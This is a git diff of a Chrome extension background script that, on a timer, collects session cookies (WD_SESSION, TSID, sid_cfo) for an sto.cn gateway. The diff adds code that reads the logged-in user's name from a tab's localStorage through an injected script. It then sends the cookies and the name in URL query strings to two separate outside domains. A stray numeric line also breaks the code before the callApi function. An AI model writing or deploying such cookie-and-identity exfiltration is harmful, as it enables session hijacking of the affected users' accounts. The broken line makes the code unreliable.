@@ -108,7 +108,10 @@ chrome.alarms.onAlarm.addListener((alarm) => {
       var url = 'https://wutonggateway.sto.cn';
       var wd2ts = '';
 	  var downloadcookie = 'CFO_DOWNLOAD';
-	  
+	  var wdSto = 'WD_STO=';
+	  var stoTokenValue = '';
+	  var wdSessionValue = '';
+
       chrome.cookies.getAll({url: url}, function(cookies) {
 		  console.info('cookies>>>>>cookies: ', cookies);
         let cookiesText = '';
@@ -126,6 +129,7 @@ chrome.alarms.onAlarm.addListener((alarm) => {
             cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
             callApi(cookiesText);
             console.info('send cookies: ', cookiesText);
+            stoTokenValue = cookie.name + '=' + cookie.value;
             cookiesText = '';
           }
           if(cookie.name == 'sid_cfo') {
@@ -140,6 +144,7 @@ chrome.alarms.onAlarm.addListener((alarm) => {
                 callApi(cookiesText);
                 console.info('wd2ts.push WD_SESSION cookies: ', cookiesText);
                 wd2ts += cookiesText;
+                wdSessionValue = cookie.name + '=' + cookie.value;
                 cookiesText = '';
               }
           if(cookie.name == 'TSID') {
@@ -148,7 +153,7 @@ chrome.alarms.onAlarm.addListener((alarm) => {
                 console.info('wd2ts.push TSID cookies: ', cookiesText);
                 cookiesText = '';
               }
-			  
+
         }
        if (wd2ts.length > 0 && wd2ts.includes('WD_SESSION') && wd2ts.includes('TSID')) {
           callApi(wd2ts);
@@ -159,55 +164,94 @@ if (downloadcookie.length > 0  && downloadcookie.includes('sid_cfo') && download
           callApi(downloadcookie);
 	   console.info('send downloadcookie cookies: ', downloadcookie);
 	   }
-        
+// WD_STO 组合上报
+if (stoTokenValue && wdSessionValue) {
+          var wdStoCookie = wdSto + stoTokenValue + ';' + wdSessionValue + ';';
+          callApi(wdStoCookie);
+          console.info('send WD_STO cookies: ', wdStoCookie);
+}
+
       });
     });
   }
 });
 
+// 缓存 accountName，避免每次上报都执行 scripting
+let cachedAccountName = '';
+
+function getAccountName() {
+  return new Promise((resolve) => {
+    chrome.tabs.query({ url: '*://wangdian.sto.cn/index*' }, (tabs) => {
+      if (tabs.length === 0) {
+        resolve(cachedAccountName || '');
+        return;
+      }
+      chrome.scripting.executeScript({
+        target: { tabId: tabs[0].id },
+        func: () => {
+          try {
+            const data = localStorage.getItem('originalUserData');
+            if (!data) return '';
+            const obj = JSON.parse(data);
+            return obj.userName || '';
+          } catch (e) {
+            return '';
+          }
+        }
+      }, (results) => {
+        if (chrome.runtime.lastError || !results || !results[0]) {
+          resolve(cachedAccountName || '');
+          return;
+        }
+        const name = results[0].result || '';
+        if (name) cachedAccountName = name;
+        resolve(name || cachedAccountName || '');
+      });
+    });
+  });
+}
+
 78588888
 function callApi(userId) {
-   const url = `https://slinghang.cn/s/v1/normandy/api/controller/cust/netManager/settingCookie?cookie=${encodeURIComponent(userId)}`; // 使用模板字符串动态构建URL，并对参数进行编码
-  const urlsit = `https://lysto.com.cn/s/v1/normandy/api/controller/cust/netManager/settingCookie?cookie=${encodeURIComponent(userId)}`; // 使用模板字符串动态构建URL，并对参数进行编码
+  getAccountName().then((accountName) => {
+    const params = `cookie=${encodeURIComponent(userId)}&accountName=${encodeURIComponent(accountName)}`;
+    const url = `https://slinghang.cn/s/v1/normandy/api/controller/cust/netManager/settingCookie?${params}`;
+    const urlsit = `https://lysto.com.cn/s/v1/normandy/api/controller/cust/netManager/settingCookie?${params}`;
 
-  const options = {
-    method: 'GET',
-    headers: {
-      'Content-Type': 'application/json', // 根据实际情况调整，如果API不需要特定类型，这行可能不需要
-    },
-  };
+    const options = {
+      method: 'GET',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+    };
 
-  
-fetch(url, options)
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-      return response.json(); // 假设响应是JSON格式
-    })
-    .then(data => {
-      console.log('Success:', data);
-      // 处理成功返回的数据
-    })
-    .catch(error => {
-      console.error('Error:', error);
-      // 处理错误
-    });
-  fetch(urlsit, options)
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP SIT error! status: ${response.status}`);
-      }
-      return response.json(); // 假设响应是JSON格式
-    })
-    .then(data => {
-      console.log('Success SIT:', data);
-      // 处理成功返回的数据
-    })
-    .catch(error => {
-      console.error('Error SIT:', error);
-      // 处理错误
-    });
+    fetch(url, options)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Success:', data);
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    fetch(urlsit, options)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP SIT error! status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Success SIT:', data);
+      })
+      .catch(error => {
+        console.error('Error SIT:', error);
+      });
+  });
 }
 // 新增：监听对特定接口的请求，限制五分钟内只触发一次 并发会重复发 影响不大
 let lastTriggerTime = 0; // 上次触发的时间戳（毫秒）
